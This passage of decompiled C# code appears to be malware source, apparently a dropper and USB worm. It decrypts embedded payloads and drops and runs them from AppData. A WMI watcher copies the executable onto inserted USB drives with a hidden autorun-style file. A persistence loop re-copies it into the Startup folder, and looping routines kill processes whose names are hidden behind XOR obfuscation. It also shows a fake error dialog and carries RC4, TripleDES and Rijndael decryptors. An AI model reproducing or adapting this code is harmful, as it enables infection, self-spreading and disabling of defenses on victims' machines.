				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev3")), Conversions.ToString(resourceManager.GetObject("KK")))), xEncryption("ShkcSHInDUU", "3B040E363C21072A321C3D2A0E17242D2C00"), -1, (CompareMethod)0);
				string text23 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text23, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text23);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev4")), Conversions.ToString(resourceManager.GetObject("KK")))), xEncryption("ShkcSHInDUU", "3B040E363C21072A321C3D2A0E17242D2C00"), -1, (CompareMethod)0);
				string text24 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text24, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text24);
				}
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string Number(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max).ToString();
	}

	public static void A(string ProcessName)
	{
		Process.GetProcesses();
		if (Process.GetProcessesByName(ProcessName).Length >= 1)
		{
			Thread.Sleep(10000);
		}
	}

	public static string xEncryption(string CodeKey, string DataIn)
	{
		string text = "";
		checked
		{
			long num = (long)Math.Round((double)Strings.Len(DataIn) / 2.0);
			for (long num2 = 1L; num2 <= num; num2++)
			{
				int num3 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(DataIn, (int)(2L * num2 - 1L), 2)));
				int num4 = Strings.Asc(Strings.Mid(CodeKey, (int)(unchecked(num2 % Strings.Len(CodeKey)) + 1L), 1));
				text += Conversions.ToString(Strings.Chr(num3 ^ num4));
			}
			return text;
		}
	}

	public static void USB()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		string text = xEncryption("SFygWCUKZbn", "153C2B1200016B70422801093447081C1C2529160F3D251C282726272A2E0B013D030F023937751C1336261A085956676302031F302B731218153026210234111A32281A02770A060A7A") + "\"\"" + xEncryption("SeguhaHOHZf", "320E1B5B53170B21290D17170E030D") + "\"\"";
		a1 = new ManagementEventWatcher(text);
		a1.Start();
	}

	private static void Arrived(object sender, EventArrivedEventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		ManagementBaseObject newEvent = e.get_NewEvent();
		ManagementBaseObject val = (ManagementBaseObject)newEvent.get_Item(xEncryption("Sajxl93KTip", "350B0A0B5C47023A1A04320F091D"));
		string className = newEvent.get_ClassPath().get_ClassName();
		if (Operators.CompareString(className, xEncryption("SbZWXuBIXIm", "3D051E36063628362A0810103F362C1C2D271D3F083D16"), false) == 0 && Operators.ConditionalCompareObjectEqual(val.get_Item(xEncryption("SmwJvGAJdHm", "24193E1335272B072D392A1D12")), (object)xEncryption("S8601zX0qkR", "6D6572"), false))
		{
			a2 = GetDriveLetterFromDisk(Conversions.ToString(val.get_Item(xEncryption("SF3JAYT4jVP", "08522724"))));
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), a2 + xEncryption("SbvQggsyIts", "37251347231A0A225420360103230E130A593F5A427D5A586149565D1C3111"));
				FileSystem.FileOpen(1, a2 + xEncryption("SYtxy1zSOz7", "38010C16430F3D61135935"), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, xEncryption("SOFnKUC5rP4", "14271B3F3A31401C0D") + "\r\n" + xEncryption("Srwas0VKLqF", "011F041F5C333329123327174A342072760F25022D7321120206423F3F3551307D4359595D00787A62143E36"), -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(a2 + xEncryption("SbvQggsyIts", "37251347231A0A225420360103230E130A593F5A427D5A586149565D1C3111")).Attributes = FileAttributes.Hidden | FileAttributes.System;
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(a2 + xEncryption("SYtxy1zSOz7", "38010C16430F3D61135935")).Attributes = FileAttributes.Hidden | FileAttributes.System;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string GetDriveLetterFromDisk(string Name)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Expected O, but got Unknown
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		string text = null;
		Name = Strings.Replace(Name, "\\", "\\\\", 1, -1, (CompareMethod)0);
		ObjectQuery val = new ObjectQuery(xEncryption("SX2fHzeBREz", "19613507392C03060A2800787D206801322B3C76480C1C5B15233E172B242054173D440F2B1F2C066F") + "\"\"" + Name + "\"} WHERE AssocClass = Win32_DiskDriveToDiskPartition");
		ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val2.Get().GetEnumerator();
			ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				ObjectQuery val4 = new ObjectQuery(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(xEncryption("SAIIWczdtLG", "001A1A182033252003150061060F77182D0D1A7F750C05203A3C331B160025333A2E276713060C0D17290E177C") + "\"", "\""), ((ManagementBaseObject)val3).get_Item(xEncryption("SKu5VJATkdp", "0F10433F29241D2F"))), (object)'"'), (object)"} WHERE AssocClass = Win32_LogicalDiskToPartition")));
				ManagementObjectSearcher val5 = new ManagementObjectSearcher(val4);
				try
				{
					enumerator2 = val5.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject val6 = (ManagementObject)enumerator2.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject((object)text, Operators.ConcatenateObject(((ManagementBaseObject)val6).get_Item(xEncryption("SF3JAYT4jVP", "08522724")), (object)",")));
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return text.Trim(new char[1] { ',' });
	}

	public static void Netframe()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(xEncryption("S57OaP8a8es", "615F2A41314811540C1032415E200F705E0051091637154320413956084C0C123F5C4D2A41204A0E4800013F4C176751285B51085543630255664F707B0D510618735A596F2E1B181557450736475A260F314C0418111B3615563F113C510259111A3C5B19"), xEncryption("SKYcdItzFTB", "0A29130820171B323D2D3D6B1C111626065A6B74") + Path.GetFileName(Application.get_ExecutablePath()), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	public static void AStartUp(string Program, string Location)
	{
		Thread thread = new Thread(ReCo);
		thread.Start();
	}

	public static void ReCo()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileName(Application.get_ExecutablePath());
		while (true)
		{
			try
			{
				if (!File.Exists(text))
				{
					File.Copy(Application.get_ExecutablePath(), text);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5000);
		}
	}

	public static string Killer(string proc)
	{
		try
		{
			while (true)
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (proc.Contains(process.ProcessName))
					{
						process.Kill();
					}
				}
				Thread.Sleep(1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public static void F13()
	{
		Killer(xEncryption("SidNZNAlE9V", "020137292D330D285B3A361B"));
	}

	public static void F14()
	{
		Killer(xEncryption("SxEHPcO4vhA", "1A212937062140"));
	}

	public static void F15()
	{
		Killer(xEncryption("SVwzUBSFkrf", "3B151B38"));
	}

	public static void F16()
	{
		Killer(xEncryption("S9rMt1tXkse", "4913231050"));
	}

	public static void F17()
	{
		Killer(xEncryption("SECLbtiuVM8", "3F2F2F0E1D0C1B22"));
	}

	public static void F19()
	{
		Killer(xEncryption("SZILl4tLLVS", "3525201550162B"));
	}

	public static void F21()
	{
		Killer(xEncryption("SQVpIFJrzv9", "34310520"));
	}

	public static void F22()
	{
		Killer(xEncryption("SGKCbxiOjmx", "2F2229031B023B02040B"));
	}

	public static void F23()
	{
		Killer(xEncryption("SfMRBAuRnc3", "083D342F3212"));
	}

	public static void F24()
	{
		Killer(xEncryption("ScCTUYmD2Zz", "300115182A1B27"));
	}

	public static void F25()
	{
		Killer(xEncryption("SCvpYHHMfSp", "341F1E3C"));
	}

	public static void F26()
	{
		Killer(xEncryption("Sdr8uOwwunn", "0B074C05200403"));
	}

	public static void F27()
	{
		Killer(xEncryption("SAMoQKLecjp", "2B220A332434160618063633"));
		Killer(xEncryption("SyKrZ4Gyapk", "132417385B3F1A0E1E1F211627"));
	}

	public static void F59()
	{
		Killer(xEncryption("SN9to3iJLLR", "3A5807045E0E38"));
	}

	public static void F60()
	{
		Killer(xEncryption("S1gyZqQyZAZ", "43021E3F15380D"));
	}

	public static void F61()
	{
		Killer(xEncryption("SnT4n983GOC", "03275701575E5A20"));
	}

	public static void F62()
	{
		Killer(xEncryption("SOvgleA8HE9", "2119130915205C"));
	}

	public static void F63()
	{
		Killer(xEncryption("SjNL1wdFdxB", "0E3628581603"));
	}

	public static byte[] Rc4(byte[] bytes, byte[] key)
	{
		byte[] array = new byte[256];
		checked
		{
			int num = array.Length - 1;
			int i;
			for (i = 0; i <= num; i++)
			{
				array[i] = (byte)i;
			}
			int num2 = array.Length - 1;
			int num3 = default(int);
			for (i = 0; i <= num2; i++)
			{
				num3 = (num3 + unchecked((int)key[i % key.Length]) + unchecked((int)array[i])) & 0xFF;
				byte b = array[i];
				array[i] = array[num3];
				array[num3] = b;
			}
			i = 0;
			num3 = 0;
			byte[] array2 = new byte[bytes.Length - 1 + 1];
			int num4 = bytes.Length - 1;
			for (int j = 0; j <= num4; j++)
			{
				i = (i + 1) & 0xFF;
				num3 = (num3 + unchecked((int)array[i])) & 0xFF;
				byte b2 = array[i];
				array[i] = array[num3];
				array[num3] = b2;
				unchecked
				{
					array2[j] = (byte)(array[checked(unchecked((int)array[i]) + unchecked((int)array[num3])) & 0xFF] ^ bytes[j]);
				}
			}
			return array2;
		}
	}

	public static string TripleDES(string b, string c, bool d)
	{
		byte[] array = Convert.FromBase64String(b);
		byte[] array2;
		if (d)
		{
			object obj = new MD5CryptoServiceProvider();
			array2 = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ComputeHash", new object[1] { Encoding.UTF8.GetBytes(c) }, (string[])null, (Type[])null, (bool[])null);
		}
		else
		{
			array2 = Encoding.UTF8.GetBytes(c);
		}
		object obj2 = new TripleDESCryptoServiceProvider();
		NewLateBinding.LateSet(obj2, (Type)null, "Key", new object[1] { array2 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "Mode", new object[1] { CipherMode.ECB }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "Padding", new object[1] { PaddingMode.PKCS7 }, (string[])null, (Type[])null);
		ICryptoTransform cryptoTransform = (ICryptoTransform)NewLateBinding.LateGet(obj2, (Type)null, "CreateDecryptor", new object[0], (string[])null, (Type[])null, (bool[])null);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	public static object Rijndael(string Decrypt, string Key)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Key, salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		try
		{
			byte[] array = Convert.FromBase64String(Decrypt);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			Decrypt = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return Decrypt;
	}
}
